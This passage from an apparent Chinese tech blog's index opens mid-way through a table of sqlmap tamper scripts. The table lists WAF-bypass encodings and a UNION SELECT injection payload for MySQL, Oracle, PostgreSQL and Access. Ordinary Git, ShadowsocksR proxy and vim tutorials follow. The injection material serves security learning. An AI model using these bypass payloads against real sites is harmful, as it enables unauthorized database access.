CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)2.”value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”</td><td></td></tr><tr><td>MySQL &gt;= 5.1.13</td><td>21</td><td>space2morehash.py</td><td>空格替换为 #号 以及更多随机字符串 换行符</td><td>* Input: 1 AND 9227=9227* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td></tr><tr><td>Oracle</td><td>1</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td><td>(‘1 AND A &gt; B’)’1 AND GREATEST(A,B+1)=A’</td></tr><tr><td>2</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”) ‘1 AND %00%271%00%27=%00%271’</td><td></td></tr><tr><td>3</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)’1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td>4</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td>5</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT* Output: InsERt</td><td></td></tr><tr><td>6</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td>7</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users* Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td>PostgreSQL</td><td>1</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td><td>(‘1 AND A &gt; B’)’1 AND GREATEST(A,B+1)=A’</td></tr><tr><td>2</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”) ‘1 AND %00%271%00%27=%00%271’</td><td></td></tr><tr><td>3</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)’1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td>4</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td><td></td></tr><tr><td>5</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td>6</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT* Output: InsERt</td><td></td></tr><tr><td>7</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td>8</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users* Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td>Access</td><td>1</td><td>appendnullbyte.py</td><td>在有效负荷结束位置加载零字节字符编码</td><td>(‘1 AND 1=1’)’1 AND 1=1%00’</td></tr><tr><td>其他</td><td></td><td>chardoubleencode.py</td><td>双url编码(不处理以编码的)</td><td>* Input: SELECT FIELD FROM%20TABLE* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td></tr><tr><td></td><td>unmagicquotes.py</td><td>宽字符绕过 GPC  addslashes</td><td>* Input: 1′ AND 1=1* Output: 1%bf%27 AND 1=1–%20</td><td></td></tr><tr><td></td><td>randomcomments.py</td><td>用/**/分割sql关键字</td><td>‘INSERT’ becomes ‘IN//S//ERT’</td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> safe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git安装,国内加速,使用技巧,常用命令</title>
      <link href="/posts/5544.html"/>
      <url>/posts/5544.html</url>
      
        <content type="html"><![CDATA[<h1 id="Git”捡shi”（这可能是一段废话）"><a href="#Git”捡shi”（这可能是一段废话）" class="headerlink" title="Git”捡shi”（这可能是一段废话）"></a>Git”捡shi”（这可能是一段废话）</h1><blockquote><p>同生活中的许多伟大事物一样，Git 诞生于一个极富纷争大举创新的年代。<br>Linux 内核开源项目有着为数众多的参与者。 绝大多数的 Linux 内核维护工作都花在了提交补丁和保存归档的繁琐事务上（1991－2002年间）。 到 2002 年，整个项目组开始启用一个专有的分布式版本控制系统 BitKeeper 来管理和维护代码。<br>到了 2005 年，开发 BitKeeper 的商业公司同 Linux 内核开源社区的合作关系结束，他们收回了 Linux 内核社区免费使用 BitKeeper 的权力。 这就迫使 Linux 开源社区（特别是 Linux 的缔造者 Linus Torvalds）基于使用 BitKeeper 时的经验教训，开发出自己的版本系统。 </p></blockquote><p><strong>他们对新的系统制订了若干目标：</strong></p><ul><li><p>速度</p></li><li><p>简单的设计</p></li><li><p>对非线性开发模式的强力支持（允许成千上万个并行开发的分支）</p></li><li><p>完全分布式</p></li><li><p>有能力高效管理类似 Linux 内核一样的超大规模项目（速度和数据量）</p></li><li><p>自诞生于 2005 年以来，Git 日臻成熟完善，在高度易用的同时，仍然保留着初期设定的目标。 它的速度飞快，极其适合管理大项目，有着令人难以置信的非线性分支管理系统（参见 Git 分支）。</p><p>总结一句：<strong>伟大的分布式版本控制系统</strong></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/6666.png" alt="6666"></p></li></ul><p> <strong>那么牛皮还是跨平台的,那就看看怎么安装的</strong></p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/%E5%B0%8F%E8%80%81%E5%BC%9F%E5%BE%80%E5%90%8E%E7%A8%8D%E7%A8%8D.gif" alt="小老弟往后稍稍"></p><h1 id="Linux下安装"><a href="#Linux下安装" class="headerlink" title="Linux下安装"></a>Linux下安装</h1><h2 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h2><p> <strong>先看下你Linux机器中有没有git,如果有-就别看我zb了</strong></p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583943133502.png" alt="检测是否存在git"></p><p> <strong>没有存在的话就开始安装，安装的话有几种方式，这里就用最最最最简单的（centos系统）</strong></p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583943239950.png" alt="如果有提示就按Y"></p><p> <strong>输入命令</strong><br> <code>git --version</code></p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583943332708.png" alt="版本信息"></p><p> <strong>要是不想秀git了</strong><br> <code>yum remove git</code> 移除默认安装</p><h3 id="设置git"><a href="#设置git" class="headerlink" title="设置git"></a>设置git</h3><pre><code>git config --global user.name &quot;你的用户名，例如github的账号&quot;git config --global user.email &quot;你的邮箱，例如github中的邮件地址&quot;git config --list`来查看设置的信息</code></pre><h1 id="Windows下安装Git"><a href="#Windows下安装Git" class="headerlink" title="Windows下安装Git"></a>Windows下安装Git</h1><h2 id="下载Git管理工具"><a href="#下载Git管理工具" class="headerlink" title="下载Git管理工具"></a>下载Git管理工具</h2><p> <a href="https://git-scm.com/downloads" target="_blank" rel="noopener">点我加入py大家庭</a></p><h2 id="欢迎加入"><a href="#欢迎加入" class="headerlink" title="欢迎加入"></a>欢迎加入</h2><p><strong>下载完成安装之后打开</strong></p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583944685133.png" alt="Git Bash"></p><h2 id="设置git-1"><a href="#设置git-1" class="headerlink" title="设置git"></a>设置git</h2><pre><code>git config --global user.name &quot;你的用户名，例如github的账号&quot;git config --global user.email &quot;你的邮箱，例如github中的邮件地址&quot;git config --list`来查看设置的信息</code></pre><h2 id="恭喜你"><a href="#恭喜你" class="headerlink" title="恭喜你"></a>恭喜你</h2><p><strong>作为全球最大同性交友平台，集结了大量的女装大佬</strong> </p><p>赶紧来git上玩耍吧</p><h2 id="新建test仓库，把本地和远程库连接"><a href="#新建test仓库，把本地和远程库连接" class="headerlink" title="新建test仓库，把本地和远程库连接"></a>新建test仓库，把本地和远程库连接</h2><h3 id="新建远程仓库"><a href="#新建远程仓库" class="headerlink" title="新建远程仓库"></a>新建远程仓库</h3><p><strong>登录到GitHub</strong></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583945051688.png" alt=" 点击New"></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583945181413.png" alt="就得这样啊"></p><h3 id="本地绑定"><a href="#本地绑定" class="headerlink" title="本地绑定"></a>本地绑定</h3><p><strong>在你的项目文件夹中</strong></p><pre><code>git init  #在当前项目的目录中生成本地的git管理</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583945492291.png" alt="当前目录下多了一个.git文件夹"></p><pre class=" language-tex"><code class="language-tex">git add .将项目上所有的文件添加到仓库中的意思，如果想添加某个特定的文件，只需把.换成这个特定的文件名即可</code></pre><pre class=" language-tex"><code class="language-tex">git commit -m "first commit"` 对这次提交的注释</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583945605584.png" alt="上面2步必需! "></p><h3 id="绑定到远程仓库"><a href="#绑定到远程仓库" class="headerlink" title="绑定到远程仓库"></a>绑定到远程仓库</h3><pre class=" language-tex"><code class="language-tex">git remote add origin 仓库地址</code></pre><h3 id="上传代码"><a href="#上传代码" class="headerlink" title="上传代码"></a>上传代码</h3><pre class=" language-tex"><code class="language-tex">git push -u origin master</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583945972775.png" alt="绑定和上传"></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583946084300.png" alt="OK "></p><h2 id="新建分支（非必需）"><a href="#新建分支（非必需）" class="headerlink" title="新建分支（非必需）"></a>新建分支（非必需）</h2><h3 id="在本地创建dev分支-并推送到远程"><a href="#在本地创建dev分支-并推送到远程" class="headerlink" title="在本地创建dev分支, 并推送到远程"></a>在本地创建dev分支, 并推送到远程</h3><pre><code>git checkout -b devgit push origin dev</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583946454974.png" alt="本地建立并上传"><br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583946432782.png" alt="dev 分支"></p><h3 id="如果本地有修改"><a href="#如果本地有修改" class="headerlink" title="如果本地有修改"></a>如果本地有修改</h3><pre><code>git add .git commit -m &quot;xxx&quot;git push origin dev</code></pre><h3 id="新的同事-克隆仓库"><a href="#新的同事-克隆仓库" class="headerlink" title="新的同事: 克隆仓库"></a>新的同事: 克隆仓库</h3><pre><code>git clone urlgit checkout -b dev origin/devgit pull origin dev</code></pre><h3 id="如果远程修改"><a href="#如果远程修改" class="headerlink" title="如果远程修改"></a>如果远程修改</h3><pre><code>git pull origin dev</code></pre><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="查看远程仓库地址"><a href="#查看远程仓库地址" class="headerlink" title="查看远程仓库地址"></a>查看远程仓库地址</h2><pre class=" language-tex"><code class="language-tex">git remote -v</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583946176703.png" alt="git remote -v"></p><h2 id="分支操作："><a href="#分支操作：" class="headerlink" title="分支操作："></a>分支操作：</h2><pre><code>git branch 创建分支git branch -b 创建并切换到新建的分支上git checkout 切换分支git branch 查看分支列表git branch -v 查看所有分支的最后一次操作git branch -vv 查看当前分支git brabch -b 分支名 origin/分支名 创建远程分支到本地git branch --merged 查看别的分支和当前分支合并过的分支git branch --no-merged 查看未与当前分支合并的分支git branch -d 分支名 删除本地分支git branch -D 分支名 强行删除分支git branch origin :分支名 删除远处仓库分支git merge 分支名 合并分支到当前分支上</code></pre><h2 id="暂存操作："><a href="#暂存操作：" class="headerlink" title="暂存操作："></a>暂存操作：</h2><pre><code>git stash 暂存当前修改git stash apply 恢复最近的一次暂存git stash pop 恢复暂存并删除暂存记录git stash list 查看暂存列表git stash drop 暂存名(例：stash@{0}) 移除某次暂存git stash clear 清除暂存</code></pre><h2 id="回退操作"><a href="#回退操作" class="headerlink" title="回退操作"></a>回退操作</h2><pre><code>git reset --hard HEAD^ 回退到上一个版本git reset --hard ahdhs1(commit_id) 回退到某个版本git checkout -- file撤销修改的文件(如果文件加入到了暂存区，则回退到暂存区的，如果文件加入到了版本库，则还原至加入版本库之后的状态)git reset HEAD file 撤回暂存区的文件修改到工作区</code></pre><h2 id="标签操作："><a href="#标签操作：" class="headerlink" title="标签操作："></a>标签操作：</h2><pre><code>git tag 标签名 添加标签(默认对当前版本)git tag 标签名 commit_id 对某一提交记录打标签git tag -a 标签名 -m &#39;描述&#39; 创建新标签并增加备注git tag 列出所有标签列表git show 标签名 查看标签信息git tag -d 标签名 删除本地标签git push origin 标签名 推送标签到远程仓库git push origin --tags 推送所有标签到远程仓库git push origin :refs/tags/标签名 从远程仓库中删除标签</code></pre><h2 id="常规操作："><a href="#常规操作：" class="headerlink" title="常规操作："></a>常规操作：</h2><pre><code>git push origin test 推送本地分支到远程仓库git rm -r --cached 文件/文件夹名字 取消文件被版本控制git reflog 获取执行过的命令git log --graph 查看分支合并图git merge --no-ff -m &#39;合并描述&#39; 分支名 不使用Fast forward方式合并，采用这种方式合并可以看到合并记录git check-ignore -v 文件名 查看忽略规则git add -f 文件名 强制将文件提交</code></pre><h1 id="加速加速"><a href="#加速加速" class="headerlink" title="加速加速"></a>加速加速</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p> 通过解析dns，直接访问GitHub的cdn节点，你会编的话就多编点。。。</p><p> <img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/%E8%A3%85%E9%80%BC%E8%99%BD%E5%A5%BD%EF%BC%8C%E4%BD%86%E4%B8%8D%E8%A6%81%E8%B4%AA%E8%A3%85%E5%93%A6.png" alt="装逼虽好，但不要贪装哦"></p><h2 id="动手吧"><a href="#动手吧" class="headerlink" title="动手吧"></a>动手吧</h2><p> 查询dns解析：<br><a href="https://tool.chinaz.com/dns" target="_blank" rel="noopener">站长之家</a></p><p><strong>把下面延迟小的记录下来</strong><br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583943710260.png" alt="enter description here"></p><p><strong>然后去修改hosts文件</strong></p><pre class=" language-tex"><code class="language-tex">C:\Windows\System32\drivers\etc\</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583943960607.png" alt="C:\Windows\System32\drivers\etc\hosts "></p><p><strong>这里修改的时候 一定要用管理员身份运行哦</strong><br><strong>这里修改的时候 一定要用管理员身份运行哦</strong><br><strong>这里修改的时候 一定要用管理员身份运行哦</strong><br>↑↑↑</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583944103112.png" alt="把刚刚记录延迟小的值使用这种方式保存进去"></p><h2 id="实在没听懂的话"><a href="#实在没听懂的话" class="headerlink" title="实在没听懂的话"></a>实在没听懂的话</h2><p><strong>这里可以借用火绒的工具去修改</strong><br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583944231742.png" alt="enter description here"></p><h3 id="刷新系统DNS缓存"><a href="#刷新系统DNS缓存" class="headerlink" title="刷新系统DNS缓存"></a>刷新系统DNS缓存</h3><p><strong>cmd中</strong></p><pre><code>ipconfig /flushdns</code></pre><h1 id="不想变秃头-遇到的问题"><a href="#不想变秃头-遇到的问题" class="headerlink" title="不想变秃头~遇到的问题"></a>不想变秃头~遇到的问题</h1><h2 id="Linux安装Git、解决ubuntu-E-无法获得锁"><a href="#Linux安装Git、解决ubuntu-E-无法获得锁" class="headerlink" title="Linux安装Git、解决ubuntu   E: 无法获得锁"></a>Linux安装Git、解决ubuntu   E: 无法获得锁</h2><p>leesun@leesun:~$ sudo apt-get install git<br>E: 无法获得锁 /var/lib/dpkg/lock-frontend - open (11: 资源暂时不可用)<br>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</p><h3 id="解决方案一"><a href="#解决方案一" class="headerlink" title="解决方案一"></a>解决方案一</h3><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">ps</span> -e <span class="token operator">|</span> <span class="token function">grep</span> apt<span class="token function">sudo</span> <span class="token function">kill</span> 进程号</code></pre><h3 id="无法解决"><a href="#无法解决" class="headerlink" title="无法解决"></a>无法解决</h3><h3 id="解决方案二"><a href="#解决方案二" class="headerlink" title="解决方案二"></a>解决方案二</h3><pre class=" language-crystal"><code class="language-crystal"><span class="token number">1</span><span class="token punctuation">.</span> sudo rm <span class="token operator">/</span>var<span class="token operator">/</span>cache<span class="token operator">/</span>apt<span class="token operator">/</span>archives<span class="token operator">/</span>lock<span class="token number">2</span><span class="token punctuation">.</span> sudo rm <span class="token operator">/</span>var<span class="token operator">/</span><span class="token keyword">lib</span><span class="token operator">/</span>dpkg<span class="token operator">/</span>lock<span class="token number">3</span><span class="token punctuation">.</span> sudo rm <span class="token operator">/</span>var<span class="token operator">/</span>cache<span class="token operator">/</span>apt<span class="token operator">/</span>archives<span class="token operator">/</span>lock<span class="token number">4</span><span class="token punctuation">.</span> sudo rm <span class="token operator">/</span>var<span class="token operator">/</span><span class="token keyword">lib</span><span class="token operator">/</span>dpkg<span class="token operator">/</span>lock<span class="token operator">-</span>frontend</code></pre><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1583944457531.png" alt="Linux安装Git、解决ubuntu   E: 无法获得锁  "></p><h2 id="rejected-master-gt-master-non-fast-forward"><a href="#rejected-master-gt-master-non-fast-forward" class="headerlink" title="[rejected]        master -&gt; master (non-fast-forward)"></a>[rejected]        master -&gt; master (non-fast-forward)</h2><h6 id="出现问题的原因："><a href="#出现问题的原因：" class="headerlink" title="出现问题的原因："></a>出现问题的原因：</h6><p>github中的有些文件不在本地代码目录中</p><h5 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h5><p><code>git pull --rebase origin master</code></p><h5 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h5><p>本地代码目录下出现gitHub中文件<br>此时 再执行以下操作 代码成功上传至github<br><code>git push -u origin master</code></p><h1 id="git使用的技巧"><a href="#git使用的技巧" class="headerlink" title="git使用的技巧"></a>git使用的技巧</h1><p><a href="https://blog.csdn.net/zcube/article/details/47841175" target="_blank" rel="noopener">用SourceTree轻松Git项目图解</a></p><p><a href="https://gitee.com/" target="_blank" rel="noopener">码云</a></p><p><a href="https://www.bootcss.com/p/git-guide/" target="_blank" rel="noopener">优秀的Git教程</a></p>]]></content>
      
      
      <categories>
          
          <category> code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shadowsocks 使用配置</title>
      <link href="/posts/6d0d.html"/>
      <url>/posts/6d0d.html</url>
      
        <content type="html"><![CDATA[<h1 id="科学上网的那些事情"><a href="#科学上网的那些事情" class="headerlink" title="科学上网的那些事情"></a>科学上网的那些事情</h1><blockquote><p>XP默认并没有安装 .NET Framework v2.0和v4.0，需要手动安装。<br>Win7/8/10的系统一般都安装了 .NET Framework v2.0和v4.0 所以都能用。<br>MAC请选择：ShadowsocksX-R、ShadowsocksX-NG、GoAgentX-SSR.dmg（GoAgent的SSR插件）</p></blockquote><h2 id="托盘颜色"><a href="#托盘颜色" class="headerlink" title="托盘颜色"></a>托盘颜色</h2><ul><li>普通情况下，图标颜色为 深蓝色。</li><li>当你选择 系统代理模式 — PAC模式 的时候，图标颜色为 浅绿色。</li><li>当你选择 系统代理模式 — 全局模式 的时候，图标颜色为 浅蓝色(浅青色)。</li><li>当你启动 服务器负载均衡 功能的时候，图标颜色从 深蓝色 变为 粉红色。</li><li>当你启动 服务器负载均衡 功能并选择 系统代理模式 — PAC模式 的时候，图标颜色为 浅橙色。</li><li>当你启动 服务器负载均衡 功能并选择 系统代理模式 — 全局模式 的时候，图标颜色为 白色</li></ul><h2 id="鼠标操作"><a href="#鼠标操作" class="headerlink" title="鼠标操作"></a>鼠标操作</h2><h3 id="单独鼠标操作"><a href="#单独鼠标操作" class="headerlink" title="单独鼠标操作"></a>单独鼠标操作</h3><ul><li>鼠标左键单击/双击 托盘图标后，会弹出 编辑服务器 窗口。</li><li>鼠标中键单击 托盘图标后，会弹出 服务器连接统计 窗口。</li><li>鼠标右键单击 托盘图标后，会弹出 托盘菜单。</li><li><h3 id="键盘-鼠标操作"><a href="#键盘-鼠标操作" class="headerlink" title="键盘+鼠标操作"></a>键盘+鼠标操作</h3></li><li>按下 Shitf键，然后鼠标左键单击 托盘图标后，会弹出 选项设置 窗口。</li><li>按下 Ctrl键，然后鼠标左键单击 托盘图标后，会弹出 服务器连接统计 窗口。</li><li>按下 Alt键，然后鼠标左键单击 托盘图标后，会弹出 端口设置 窗口。</li></ul><h2 id="科学上网是不科学的"><a href="#科学上网是不科学的" class="headerlink" title="科学上网是不科学的~"></a>科学上网是不科学的~</h2><h2 id="Shadowsocks是否安全？"><a href="#Shadowsocks是否安全？" class="headerlink" title="Shadowsocks是否安全？"></a>Shadowsocks是否安全？</h2><p><strong>Shadowsocks是被设计来混淆数据，增加 墙 检查出流量特征所需的计算量，提高实时检测和匹配的成本，而不是加密。</strong></p><p>Shadowsocks是一个业余兴趣制作的项目，并没有经过严谨的密码学算法计算，Shadowsocks不是一个VPN，它无法100%的保护你的数据安全！</p><h1 id="教你怎么打开ShadowsocksR软件"><a href="#教你怎么打开ShadowsocksR软件" class="headerlink" title="教你怎么打开ShadowsocksR软件"></a>教你怎么打开ShadowsocksR软件</h1><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/%E7%AC%91%E8%AF%9D.png" alt="笑话"></p><h2 id="开启飞机"><a href="#开启飞机" class="headerlink" title="开启飞机"></a>开启飞机</h2><p><strong>将下载的ssr客户端解压出来</strong></p><p><em>如果是XP用户，请直接使用“dotnet2.0”版本</em></p><h3 id="打开程序"><a href="#打开程序" class="headerlink" title="打开程序"></a>打开程序</h3><p><strong>在任务栏处会有纸飞机样子的图标，那就是我们要操作的小飞机</strong></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584020167666.png" alt="右键服务器订阅 "></p><p><strong>把默认的订阅删除掉</strong></p><h1 id="系统代理模式介绍"><a href="#系统代理模式介绍" class="headerlink" title="系统代理模式介绍"></a>系统代理模式介绍</h1><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584020290877.png" alt="系统代理模式"></p><h2 id="直连模式"><a href="#直连模式" class="headerlink" title="直连模式"></a>直连模式</h2><blockquote><p>会关闭系统HTTP代理，你的所有HTTP上网流量都不会通过SSR代理，在此模式下你只能使用Socks5代理方式连接SSR代理</p></blockquote><h2 id="PAC模式"><a href="#PAC模式" class="headerlink" title="PAC模式"></a>PAC模式</h2><blockquote><p>会修改系统IE代理，使用PAC文件控制代理。PAC文件包含了规则列表，可以控制哪些流量走SSR，哪些不走（例如国内流量直连，国外走代理），做到智能代理。但是实际上此功能已经可以被“代理规则”设置完全代替（除非你一定要用gfwlist），因此一般不用这一模式。</p></blockquote><p><strong>PAC文件为SSR根目录下的pac.txt。</strong></p><h2 id="全局模式"><a href="#全局模式" class="headerlink" title="全局模式"></a>全局模式</h2><blockquote><p>会开启系统HTTP代理，你的所有HTTP上网流量将会通过SSR代理。</p></blockquote><h2 id="保持当前状态不修改"><a href="#保持当前状态不修改" class="headerlink" title="保持当前状态不修改"></a>保持当前状态不修改</h2><blockquote><p>不会对你目前的系统HTTP代理状态进行任何的修改</p></blockquote><h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><blockquote><p>PAC规则 是根据PAC文件中的黑白地址名单来判断那些网站走代理，也就是判断 流量数据是进入SSR客户端还是直连。</p></blockquote><p><strong>每个选项会执行什么操作、有什么效果，都在菜单中写的清清楚楚。</strong></p><h2 id="代理规则"><a href="#代理规则" class="headerlink" title="代理规则"></a>代理规则</h2><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584020818207.png" alt="pac代理规则"></p><ul><li>绕过局域网，局域网内IP 不走代理直连，局域网外IP 都走代理。</li><li>绕过局域网和大陆，访问网站的是 大陆IP 都不走代理直连，访问 非大陆IP 的网站都走代理。</li><li>绕过局域网和非大陆，访问网站的是 大陆IP 都走代理，访问 非大陆IP 的网站都不走代理，这个一般是海外访问国内网站用的。</li><li>全局，直接走代理</li></ul><h1 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h1><blockquote><p>负载均衡功能，适用于网页浏览，不适用于看视频或下载等需要大流量的环境。如需下载请在连接统计窗口通过下载测速测试速度最快的服务器然后单独连接之。<br>简单的说就是，用用这个节点用用那个节点，不照着一个节点用，并不是所有Shadowsocks账号都一起使用，达成所有节点负载均衡的目的。所以大流量的时候不要开这个。</p></blockquote><h1 id="SSR-服务器订阅设置"><a href="#SSR-服务器订阅设置" class="headerlink" title="SSR 服务器订阅设置"></a>SSR 服务器订阅设置</h1><blockquote><p>点击“ADD”，然后在右侧填入你的SSR服务器订阅地址，即可添加一条服务器订阅，然后直接点击确定即可。如果你勾选了左下角的“自动更新”，在每次SSR启动的时候都会自动更新订阅，一般情况下无需选择。</p></blockquote><h1 id="更新服务器订阅"><a href="#更新服务器订阅" class="headerlink" title="更新服务器订阅"></a>更新服务器订阅</h1><blockquote><p>将会从已经设置的订阅地址中获取配置信息自动添加/更新至服务器配置中，并且此操作会通过你当前的SSR代理进行！如果你目前的SSR代理不是可用的代理，那么将会更新失败！因此建议选择“更新服务器订阅（不通过代理）”。一般只有SSR服务器订阅地址不能在墙内访问而你有可以使用的SSR代理配置的时候才需要使用SSR代理更新订阅。</p></blockquote><h1 id="浏览器使用代理"><a href="#浏览器使用代理" class="headerlink" title="浏览器使用代理"></a>浏览器使用代理</h1><p>要注意，在浏览器中使用要代理到127.0.0.1:1080<br><strong>Google浏览器插件：SwitchyOmega</strong></p><h1 id="kali中使用ssr"><a href="#kali中使用ssr" class="headerlink" title="kali中使用ssr"></a>kali中使用ssr</h1><ul><li><p>ssr 右键点击选项设置</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584021718807.png" alt="选项设置 ">、</p></li><li><p>查看虚拟机与主机ip，确保互通，测试虚拟机能否telnet主机的1080端口<br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584021877250.png" alt="主机ip"></p></li></ul><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584022075612.png" alt="要使用代理的内网"></p><pre class=" language-vim"><code class="language-vim">#新建代理脚本<span class="token keyword">vim</span> <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">profile</span><span class="token operator">.</span><span class="token keyword">d</span><span class="token operator">/</span>proxy<span class="token operator">.</span><span class="token keyword">sh</span>#在proxy<span class="token operator">.</span><span class="token keyword">sh</span>中写入、添加主机代理端口信息，之后保存退出export ALL_PROXY<span class="token operator">=</span>socks5<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token operator">.</span><span class="token number">128.1</span><span class="token punctuation">:</span><span class="token number">1080</span>#使生效<span class="token keyword">source</span> <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">profile</span><span class="token operator">.</span><span class="token keyword">d</span><span class="token operator">/</span>proxy<span class="token operator">.</span><span class="token keyword">sh</span></code></pre><h2 id="虚拟机里的浏览器代理插件代理即可"><a href="#虚拟机里的浏览器代理插件代理即可" class="headerlink" title="虚拟机里的浏览器代理插件代理即可"></a>虚拟机里的浏览器代理插件代理即可</h2>]]></content>
      
      
      <categories>
          
          <category> 使用说明 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim命令大全</title>
      <link href="/posts/b8e.html"/>
      <url>/posts/b8e.html</url>
      
